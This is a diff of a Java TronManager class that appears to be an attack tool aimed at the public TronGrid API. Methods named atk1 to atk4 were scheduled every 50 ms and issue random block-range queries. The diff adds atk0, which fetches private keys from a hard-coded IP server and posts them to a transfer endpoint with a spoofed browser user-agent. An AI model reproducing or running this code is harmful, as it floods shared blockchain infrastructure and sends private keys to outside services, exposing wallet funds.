@@ -1,6 +1,8 @@
 package com.just.dstron.manager;
 
+import com.alibaba.fastjson.JSON;
 import com.alibaba.fastjson.JSONObject;
+import com.just.dstron.entity.TronAccountBO;
 import com.just.dstron.utils.MyUtils;
 import lombok.extern.slf4j.Slf4j;
 import org.nutz.http.*;
@@ -40,27 +42,60 @@ public class TronManager {
             @Override
             public void run() {
                 try {
-                    cnt+=1;
-                    if(cnt%10==0){
-                        log.info("cnt:{}",cnt);
-                    }
-                    if(cnt%4==0){
-                        atk1();
-                    }
-                    if(cnt%4==1){
-                        atk2();
-                    }
-                    if(cnt%4==2){
-                        atk3();
-                    }
-                    if(cnt%4==3){
-                        atk4();
-                    }
+//                    cnt+=1;
+//                    if(cnt%10==0){
+//                        log.info("cnt:{}",cnt);
+//                    }
+//                    if(cnt%4==0){
+//                        atk3();
+//                    }
+//                    if(cnt%4==1){
+//                        atk3();
+//                    }
+//                    if(cnt%4==2){
+//                        atk3();
+//                    }
+//                    if(cnt%4==3){
+//                        atk3();
+//                    }
+//                    atk0();
+                    log.info("aaaaaa");
                 }catch (Exception e){
                     e.printStackTrace();
                 }
             }
-        },100,50, TimeUnit.MILLISECONDS);
+        },100,5000, TimeUnit.MILLISECONDS);
+    }
+
+    private void atk0(){
+        TronAccountBO fromBO=getTronAccount();
+        if(fromBO.getCode()==0){
+            TronAccountBO toBO=getTronAccount();
+            if(toBO.getCode()==0){
+                String key=fromBO.getKey();
+                String to=toBO.getAddress();
+                Integer amount = 1;
+                String url = "https://api.trongrid.io/wallet/easytransferbyprivate";
+                JSONObject params=new JSONObject();
+                params.put("privateKey",key);
+                params.put("toAddress",to);
+                params.put("amount",amount);
+                Header header=Header.create().set("user-agent","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.88 Safari/537.36");
+                Response response = Http.post3(url,params.toJSONString(), header,5000);
+                String respStr=response.getContent();
+                JSONObject respObj=JSON.parseObject(respStr);
+                if(respObj!=null){
+                    log.info("respObj:{}",respObj);
+                }
+            }
+        }
+    }
+
+    private TronAccountBO getTronAccount(){
+        String url="http://8.210.213.12/tron/getAccount";
+        String resp = Http.get(url).getContent();
+        TronAccountBO tronAccountBO=JSON.parseObject(resp,TronAccountBO.class);
+        return tronAccountBO;
     }
 
     private void atk1(){
@@ -95,10 +130,10 @@ public class TronManager {
             int block = random.nextInt(24888200);
             JSONObject params=new JSONObject();
             params.put("startNum",block);
-            params.put("endNum",block+random.nextInt(5));
+            params.put("endNum",block+random.nextInt(90));
             Response response = Http.post3("https://api.trongrid.io/wallet/getblockbylimitnext",params.toJSONString(), Header.create(),5000);
         }catch (Exception e){
-
+            e.printStackTrace();
         }
     }
 
